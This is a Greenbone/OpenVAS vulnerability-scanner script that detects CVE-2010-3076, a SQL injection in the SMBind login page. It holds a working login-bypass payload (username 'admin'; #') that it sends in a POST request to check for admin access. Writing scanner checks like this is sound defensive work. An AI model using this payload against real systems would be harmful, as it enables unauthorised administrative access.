if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800186" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-12-09 06:49:11 +0100 (Thu, 09 Dec 2010)" );
	script_cve_id( "CVE-2010-3076" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Simple Management BIND Admin Login Page SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/14884/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/93486/smbind-sql.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause SQL Injection attack
  and gain sensitive information." );
	script_tag( name: "affected", value: "SMBind version 0.4.7 and prior" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input passed via
  the 'username' parameter to 'php/src/include.php', which allows attacker to
  manipulate SQL queries by injecting arbitrary SQL code." );
	script_tag( name: "solution", value: "Upgrade to 0.4.8 or later." );
	script_tag( name: "summary", value: "This host is running Simple Managemen Bind and is prone to SQL
  injection vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/smbind/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/smbind", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	path = dir + "/src/main.php";
	res = http_get_cache( item: path, port: port );
	if(ContainsString( res, ">Simple Management for BIND" )){
		useragent = http_get_user_agent();
		postData = "username=admin%27%3B+%23&password=test&Submit=Login";
		req = NASLString( "POST ", path, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", postData );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ">Change password<" ) && ContainsString( res, ">Log out<" ) && ContainsString( res, ">Commit changes<" )){
			report = http_report_vuln_url( port: port, url: path );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

